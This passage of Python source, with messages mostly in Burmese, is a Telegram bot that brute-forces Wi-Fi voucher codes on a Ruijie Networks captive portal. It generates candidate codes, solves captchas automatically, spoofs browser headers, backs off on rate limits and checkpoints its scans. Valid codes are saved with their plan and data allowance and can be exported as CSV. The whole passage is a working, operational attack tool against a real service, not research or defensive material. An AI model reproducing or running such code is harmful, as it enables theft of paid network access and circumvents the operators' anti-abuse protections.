                final_cp = _make_cp(idx, {})

                while not _target_hit() and not _should_stop():
                    batch = list(itertools.islice(codes, Config.BATCH_SIZE))
                    if not batch:
                        break
                    found = await _run_batch(batch)
                    total_found += found
                    length_checked += len(batch)

                    if rl_hits_count()[0] > rl_hits:
                        rl_hits = rl_hits_count()[0]
                        sem.on_rate_limit()

                    elapsed = time.monotonic() - scan_start
                    speed = length_checked / elapsed * 60 if elapsed > 0 else 0
                    remaining = max(0, total_for_length - length_checked)
                    eta = remaining / (speed / 60) if speed > 0 else None

                    progress_msg_id = await _safe_edit(
                        chat_id, progress_msg_id,
                        format_progress(length_checked, total_for_length, speed,
                                        total_found, params, length, eta,
                                        sem.current, rl_hits),
                    )
                    final_cp = _make_cp(idx, {})
                    _save_checkpoint(chat_id, final_cp)  # throttled

        else:
            code_iters = {l: iter_codes(params.mode, l) for l in params.lengths}
            checked_per_len = {l: 0 for l in params.lengths}
            if resume_cp and resume_cp.offsets:
                for l, off in resume_cp.offsets:
                    checked_per_len[l] = off

            # resume offset skip
            for l in params.lengths:
                skip = checked_per_len.get(l, 0)
                for _ in range(skip):
                    next(code_iters[l])

            cur_len = params.lengths[0]

            while not _target_hit() and not _should_stop():
                for length in params.lengths:
                    if _target_hit() or _should_stop():
                        break
                    cur_len = length
                    batch = [next(code_iters[length]) for _ in range(Config.BATCH_SIZE)]
                    found = await _run_batch(batch)
                    total_found += found
                    checked_per_len[length] += len(batch)

                    if rl_hits_count()[0] > rl_hits:
                        rl_hits = rl_hits_count()[0]
                        sem.on_rate_limit()

                    total_checked = sum(checked_per_len.values())
                    elapsed = time.monotonic() - scan_start
                    speed = total_checked / elapsed * 60 if elapsed > 0 else 0

                    progress_msg_id = await _safe_edit(
                        chat_id, progress_msg_id,
                        format_progress(checked_per_len[length], None, speed,
                                        total_found, params, length, None,
                                        sem.current, rl_hits),
                    )
                    final_cp = _make_cp(0, checked_per_len)
                    _save_checkpoint(chat_id, final_cp)  # throttled

        # natural finish
        if _target_hit():
            _clear_checkpoint(chat_id)
            s.checkpoint = None
            await _safe_edit(chat_id, progress_msg_id,
                             f"🎯 Target {params.target} ရောက်ပါပြီ!\n💎 Found: {total_found}")
        elif not _should_stop():
            _clear_checkpoint(chat_id)
            s.checkpoint = None
            await _safe_edit(chat_id, progress_msg_id,
                             f"✅ ရှာဖွေမှု ပြီးဆုံးပါပြီ\n"
                             f"📦 Lengths: {', '.join(str(l) for l in params.lengths)}\n"
                             f"💎 Found: {total_found}")

    except asyncio.CancelledError:
        if final_cp:
            s.checkpoint = final_cp
            _save_checkpoint(chat_id, final_cp, force=True)
        raise
    finally:
        ct = s.scan_task
        if ct and ct.scan_id == scan_id and ct.stop and s.checkpoint is None and final_cp:
            s.checkpoint = final_cp
            _save_checkpoint(chat_id, final_cp, force=True)
        if s.scan_task and s.scan_task.scan_id == scan_id:
            s.scan_task = None


# ── Core voucher check ───────────────────────────────────────────────────────
async def perform_check(session_url: str, code: str, chat_id: int,
                        scan_id: Optional[str] = None, recheck: bool = False,
                        plan_filters: Optional[list[int]] = None,
                        data_filters: Optional[list[int]] = None) -> Optional[str]:

    def _valid() -> bool:
        if recheck:
            return True
        ct = state.get(chat_id).scan_task
        return ct is not None and ct.scan_id == scan_id and not ct.stop

    raw: Optional[str] = None
    last_sid: Optional[str] = None

    for attempt in range(Config.RATE_LIMIT_RETRIES):
        if not _valid():
            return None

        ts = await _acquire_session()
        try:
            sid = await fetch_session_id(ts, session_url)
            if not sid:
                continue
            last_sid = sid

            auth_code = await solve_captcha_loop(ts, sid)
            if not auth_code:
                continue
            if not _valid():
                return None

            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (f"https://portal-as.ruijienetworks.com/download/static/"
                            f"maccauth/src/index.html?sessionId={sid}"),
                "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                               "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
            }
            try:
                async with ts.post(
                    Config.POST_URL,
                    json={"accessCode": code, "sessionId": sid,
                          "apiVersion": 1, "authCode": auth_code},
                    headers=headers,
                ) as r:
                    raw = await r.text()
                    logger.info("code=%s attempt=%d status=%d", code, attempt + 1, r.status)
            except Exception as e:
                logger.debug("perform_check POST: %s", e)
                return None
        finally:
            await _release_session(ts)

        if raw and "request limited" in raw:
            _rl_counter[0] += 1
            sleep = min(Config.RATE_LIMIT_MAX_SLEEP,
                        Config.RATE_LIMIT_SLEEP * (2 ** attempt))
            logger.warning("Rate-limited code=%s (%d/%d) sleep=%.1fs",
                           code, attempt + 1, Config.RATE_LIMIT_RETRIES, sleep)
            await asyncio.sleep(sleep)
            raw = None
            continue
        break

    if not raw:
        return None
    s = state.get(chat_id)

    if "logonUrl" in raw:
        if recheck:
            return code

        token = last_sid
        try:
            parsed = json.loads(raw)
            logon = parsed.get("result", {}).get("logonUrl", "") if isinstance(parsed, dict) else ""
            m = re.search(r"token=(.*?)&", logon)
            if m:
                token = m.group(1)
        except Exception:
            pass

        plan_display, minutes, data_kb = await get_code_info(token or last_sid or "")

        if (plan_filters or data_filters) and not matches_filter(
                minutes, data_kb, plan_filters or [], data_filters or []):
            logger.debug("code=%s filtered (plan=%s data=%s)", code, minutes, data_kb)
            return None

        display = f"🎫 `{code}`\n   {plan_display}"
        s.success_codes.append(FoundCode(
            code=code, session_id=last_sid or "", plan=plan_display,
            display=display, plan_minutes=minutes, data_kb=data_kb,
        ))
        if s.notify:
            _notify_success_deb.schedule(chat_id, s)
        return code

    if "STA" in raw:
        s.limited_codes.append(code)
        if s.notify:
            _notify_limited_deb.schedule(chat_id, s)

    return None


# ── Keep-alive web server ───────────────────────────────────────────────────
async def start_web_server() -> None:
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    try:
        await web.TCPSite(runner, "0.0.0.0", Config.PORT).start()
        logger.info("Web server on port %d", Config.PORT)
    except OSError as e:
        logger.warning("Web server: %s", e)


# ── Keyboard ────────────────────────────────────────────────────────────────
def kb_resume_new() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(InlineKeyboardButton("▶️ Resume", callback_data="resume_scan"),
           InlineKeyboardButton("🆕 New Scan", callback_data="new_scan"))
    return kb


# ── Scan launcher ────────────────────────────────────────────────────────────
async def launch_scan(chat_id: int, params: ScanParams,
                      resume_cp: Optional[ScanCheckpoint] = None) -> None:
    s = state.get(chat_id)
    lengths_str = ", ".join(str(l) for l in params.lengths)
    target_str = f" | Target: {params.target}" if params.target else ""

    filt = []
    if params.plans:
        filt.append("⏱ " + " / ".join(plan_label(m) for m in params.plans))
    if params.data:
        filt.append("💾 " + " / ".join(data_label(k) for k in params.data))
    filt_str = (" | " + " | ".join(filt)) if filt else ""

    resume_str = "\n♻️ Checkpoint မှ ဆက်တင်သည်" if resume_cp else ""

    pm = await bot.send_message(
        chat_id,
        f"🔍 Scan စတင်သည်\n"
        f"🎯 Mode: {Config.BRUTE_MODES[params.mode]['name']}\n"
        f"📏 Lengths: {lengths_str}{target_str}{filt_str}{resume_str}",
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(params, chat_id, s.session_url, scan_id, pm.message_id, resume_cp)
    )
    s.scan_task = ScanTask(task=task, scan_id=scan_id)
    s.success_msg_id = None
    s.limited_msg_id = None


# ── Bot commands ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(message):
    if not Config.is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    await bot.reply_to(
        message,
        "🤖 Voucher Bot မှ ကြိုဆိုပါသည်!\n/help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။",
    )


@bot.message_handler(commands=["help"])
async def cmd_help(message):
    if not Config.is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    await bot.reply_to(message, (
        "📖 Voucher Bot — အသုံးပြုနည်း\n\n"
        "၁။ Setup:\n"
        "   /setup <session_url>\n\n"
        "၂။ ရှာဖွေခြင်း:\n"
        "   /brute <mode> <lengths> [target] [plan...] [data...]\n\n"
        "   Mode:\n"
        "     1 = Digits (0-9)\n"
        "     2 = Lowercase (a-z)\n"
        "     3 = Uppercase (A-Z)\n"
        "     4 = Mixed (a-zA-Z)\n"
        "     5 = Lowercase + Digits\n\n"
        "   Lengths:\n"
        "     6         → length 6\n"
        "     6,7,8     → 6,7,8 ဆက်တိုက်\n"
        "     6-8       → range 6-8\n"
        "     6,8-10,12 → mixed\n\n"
        "   Target (optional): ရှာဖွေမည့် code အရေအတွက်\n\n"
        "   Plan filter (optional): 1h 3h 1d 7d 1mo 1y\n"
        "   Data filter (optional): 500mb 1gb 2gb\n\n"
        "   ဥပမာ:\n"
        "     /brute 1 6 5\n"
        "     /brute 1 4-8 10\n"
        "     /brute 5 4,6-8 1d\n"
        "     /brute 2 6 1d 1mo\n"
        "     /brute 1 6 5 1gb\n"
        "     /brute 5 4,6-8 1d 500mb\n\n"
        "   Digit mode  → တစ်ခုခင်း ကုန်သည်ထိ ရှာ\n"
        "   Other modes → lengths အားလုံ rotate ရှာ\n\n"
        "၃။ /status      — dashboard\n"
        "၄။ /stop        — ရပ်တန့် (checkpoint save)\n"
        "၅။ /resume      — ဆက်ရှာ\n"
        "၆။ /saved       — ရလဒ်ကြည့်\n"
        "၇။ /saved_csv   — CSV ထုတ်\n"
        "၈။ /delete_saved — ရလဒ်ဖျက်\n"
        "၉။ /recheck     — success codes ပြန်စစ်\n"
        "၁၀။ /notify     — notify ON/OFF\n"
        "၁၁။ /stats      — global stats"
    ))


@bot.message_handler(commands=["setup"])
async def cmd_setup(message):
    if not Config.is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await bot.reply_to(message, "Usage: /setup <session_url>"); return
    url = parts[1].strip()
    chat_id = message.chat.id
    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        s = state.get(chat_id)
        s.session_url = url
        state.clear_results(chat_id)
        await bot.reply_to(message,
                           "✅ Session URL သိမ်းဆည်းပြီးပါပြီ!\n/brute ဖြင့် စတင်နိုင်ပါပြီ။")
    else:
        await bot.reply_to(message,
                           "❌ Session URL မှားယွင်းနေပါသည် (sessionId မတွေ့)။")


@bot.message_handler(commands=["brute"])
async def cmd_brute(message):
    if not Config.is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return

    raw_args = message.text.split()[1:]
    try:
        params = parse_brute_args(raw_args)
    except ValueError as e:
        await bot.reply_to(message, f"❌ {e}\n\n/help ကြည့်ပါ"); return

    chat_id = message.chat.id
    s = state.get(chat_id)

    async with s.scan_lock:
        if not s.session_url:
            await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ"); return
        if state.is_scanning(chat_id):
            await bot.reply_to(message, "⚠️ Scan မပြီးသေးပါ။ /stop ဦးသုံးပါ"); return

        if s.checkpoint:
            s.pending_params = params
            cp = s.checkpoint
            prev_len = ", ".join(str(l) for l in cp.lengths)
            await bot.reply_to(
                message,
                f"ယခင် scan ရှိထားသည် (Found: {cp.total_found})\n"
                f"Mode: {cp.mode} | Lengths: {prev_len}\n\n"
                f"ပြန်မလား, အသစ်စမလား?",
                reply_markup=kb_resume_new(),
            )
            return

        await launch_scan(chat_id, params)


@bot.callback_query_handler(func=lambda c: c.data in ("resume_scan", "new_scan"))
async def handle_resume(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    s = state.get(chat_id)

    async with s.scan_lock:
        if call.data == "resume_scan":
            cp = s.checkpoint
            if not cp:
                await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။",
                                            chat_id=chat_id,
                                            message_id=call.message.message_id)
                return
            params = cp.as_params()
            s.checkpoint = None
            await bot.edit_message_text("▶️ ယခင် scan ပြန်စပါပြီ။",
                                        chat_id=chat_id,
                                        message_id=call.message.message_id)
            await launch_scan(chat_id, params, resume_cp=cp)
        else:
            params = s.pending_params
            s.checkpoint = None
            s.pending_params = None
            _clear_checkpoint(chat_id)
            if params:
                await bot.edit_message_text("🆕 Scan အသစ်စတင်ပါပြီ။",
                                            chat_id=chat_id,
                                            message_id=call.message.message_id)
                await launch_scan(chat_id, params)
            else:
                await bot.edit_message_text("Command ပြန်ပေးပါ။",
                                            chat_id=chat_id,
                                            message_id=call.message.message_id)


@bot.message_handler(commands=["stop"])
async def cmd_stop(message):
    if not Config.is_admin(message.chat.id): return
    s = state.get(message.chat.id)
    if s.scan_task and not s.scan_task.task.done():
        s.scan_task.stop = True
        s.scan_task.task.cancel()
        await bot.reply_to(message, "⏹ ရပ်ပြီးပါပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
    else:
        await bot.reply_to(message, "⚠️ ရပ်ရန် Scan မရှိပါ။")


@bot.message_handler(commands=["resume"])
async def cmd_resume(message):
    if not Config.is_admin(message.chat.id): return
    chat_id = message.chat.id
    s = state.get(chat_id)

    cp = s.checkpoint or _load_checkpoint(chat_id)
    if not cp:
        await bot.reply_to(message, "⚠️ ခင်ရပ်ထားသော scan မရှိပါ"); return
    params = cp.as_params()
    s.checkpoint = None
    await bot.reply_to(message, "▶️ ယခင် scan ပြန်စပါပြီ။")
    await launch_scan(chat_id, params, resume_cp=cp)


@bot.message_handler(commands=["status"])
async def cmd_status(message):
    if not Config.is_admin(message.chat.id): return
    chat_id = message.chat.id
    s = state.get(chat_id)
    found = len(s.success_codes)

    if not state.is_scanning(chat_id):
        cp = s.checkpoint or _load_checkpoint(chat_id)
        cp_str = f"\n♻️ Resume နိုင်သည် (Found: {cp.total_found})" if cp else ""
        await bot.reply_to(
            message,
            f"⚠️ Scan မရှိပါ။\n💎 Found so far: {found}{cp_str}",
        )
        return

    rate = (_captcha_ok / _captcha_tried * 100) if _captcha_tried else 0
    await bot.reply_to(
        message,
        f"📋 Status: Running\n"
        f"💎 Found: {found}\n"
        f"⚠️ Limited: {len(s.limited_codes)}\n"
        f"⏱ Uptime: {state.uptime()}\n"
        f"🔐 Captcha: {_captcha_ok}/{_captcha_tried} ({rate:.0f}%)\n"
        f"🚦 Rate-limits hit: {_rl_counter[0]}",
    )


@bot.message_handler(commands=["stats"])
async def cmd_stats(message):
    if not Config.is_admin(message.chat.id): return
    rate = (_captcha_ok / _captcha_tried * 100) if _captcha_tried else 0
    await bot.reply_to(
        message,
        f"📊 Global Stats\n"
        f"⏱ Uptime: {state.uptime()}\n"
        f"🔐 Captcha: {_captcha_ok}/{_captcha_tried} ({rate:.0f}%)\n"
        f"🚦 Rate-limits hit: {_rl_counter[0]}\n"
        f"🧵 Max concurrency: {Config.CONCURRENCY}\n"
        f"🧠 Captcha gate: {_captcha_gate._value} free",
    )


@bot.message_handler(commands=["saved"])
async def cmd_saved(message):
    if not Config.is_admin(message.chat.id): return
    chat_id = message.chat.id
    s = state.get(chat_id)
    if not s.success_codes and not s.limited_codes:
        await bot.reply_to(message, "⚠️ Code မရှိသေးပါ"); return

    parts: list[str] = []
    if s.success_codes:
        parts.append(f"✅ Success Codes ({len(s.success_codes)})")
        parts.extend(fc.display or f"🎫 `{fc.code}`\n   {fc.plan}" for fc in s.success_codes)
    if s.limited_codes:
        parts.append(f"\n⚠️ Limited Codes ({len(s.limited_codes)})")
        parts.extend(s.limited_codes)

    full = "\n\n".join(parts)
    for i in range(0, len(full), 4000):
        await bot.send_message(chat_id, full[i:i + 4000], parse_mode="Markdown")


@bot.message_handler(commands=["saved_csv"])
async def cmd_saved_csv(message):
    if not Config.is_admin(message.chat.id): return
    chat_id = message.chat.id
    s = state.get(chat_id)
    if not s.success_codes:
        await bot.reply_to(message, "⚠️ Success code မရှိပါ"); return

    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["code", "plan", "plan_minutes", "data_kb", "session_id"])
    for fc in s.success_codes:
        w.writerow([fc.code, fc.plan, fc.plan_minutes or "", fc.data_kb or "", fc.session_id])

    data = buf.getvalue().encode("utf-8")
    await bot.send_document(
        chat_id,
        document=("voucher_codes.csv", data),
        caption=f"📄 {len(s.success_codes)} codes",
    )


@bot.message_handler(commands=["delete_saved"])
async def cmd_delete_saved(message):
    if not Config.is_admin(message.chat.id): return
    chat_id = message.chat.id
    s = state.get(chat_id)
    count = len(s.success_codes) + len(s.limited_codes)
    state.clear_results(chat_id)
    await bot.reply_to(message, f"✅ Code {count} ခု ဖျက်ပြီးပါပြီ")


@bot.message_handler(commands=["recheck"])
async def cmd_recheck(message):
    if not Config.is_admin(message.chat.id): return
    chat_id = message.chat.id
    s = state.get(chat_id)
    if not s.session_url:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ"); return
    if not s.success_codes:
        await bot.reply_to(message, "⚠️ Success code မရှိပါ"); return

    await bot.reply_to(message, "⏳ ပြန်စစ်ဆေးနေပါသည်...")
    valid: list[FoundCode] = []
    for fc in s.success_codes:
        if await perform_check(s.session_url, fc.code, chat_id, recheck=True):
            valid.append(fc)
    s.success_codes = valid
    s.success_msg_id = None
    await bot.reply_to(
        message,
        f"✅ Recheck ပြီး {len(valid)} ခု ကျန်ပါသည်" if valid
        else "Recheck ပြီး code မကျန်ပါ",
    )


@bot.message_handler(commands=["notify"])
async def cmd_notify(message):
    if not Config.is_admin(message.chat.id): return
    s = state.get(message.chat.id)
    s.notify = not s.notify
    await bot.reply_to(message, f"📢 Notification: {'ON ✅' if s.notify else 'OFF ❌'}")


# ── Polling + graceful shutdown (bug #10 fix) ────────────────────────────────
async def _poll() -> None:
    """
    Long-poll timeout=30, request_timeout=45.
    နှစ်ခု တူနေရင် race ဖြစ်သည် → request_timeout က timeout ထက် အမြဲ ကြီးရမည်။
    """
    backoff = 3
    while True:
        try:
            await bot.infinity_polling(timeout=30, request_timeout=45)
            return
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.warning("Polling: %s — retry in %ds", e, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


async def main() -> None:
    global _global_session, _connector, _web_task
    Config.validate()
    _connector = aiohttp.TCPConnector(
        limit=1000,
        limit_per_host=0,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
    )
    _global_session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False,
    )
    logger.info("🚀 Voucher Bot starting... (cpu=%s, captcha_gate=%s)",
                os.cpu_count(), _captcha_gate._value)

    # graceful shutdown
    loop = asyncio.get_running_loop()
    stop_event = asyncio.Event()

    def _shutdown():
        logger.info("⏹ Shutdown signal — checkpoint save...")
        for chat_id, s in state._chats.items():
            if s.checkpoint:
                _save_checkpoint(chat_id, s.checkpoint, force=True)
            if s.scan_task and not s.scan_task.task.done():
                s.scan_task.stop = True
                s.scan_task.task.cancel()
        stop_event.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _shutdown)
        except (NotImplementedError, ValueError):
            pass

    # web server task
    _web_task = asyncio.create_task(start_web_server())
    _web_task.add_done_callback(
        lambda t: logger.error("Web server crashed: %s", t.exception())
        if not t.cancelled() and t.exception() else None
    )

    poll_task = asyncio.create_task(_poll())

    try:
        await asyncio.wait(
            [poll_task, asyncio.create_task(stop_event.wait())],
            return_when=asyncio.FIRST_COMPLETED,
        )
    finally:
        poll_task.cancel()
        if _web_task and not _web_task.done():
            _web_task.cancel()
        # session pool ရှင်းလင်း
        await _drain_session_pool()
        await _global_session.close()
        await _connector.close()
        logger.info("👋 Bot stopped.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
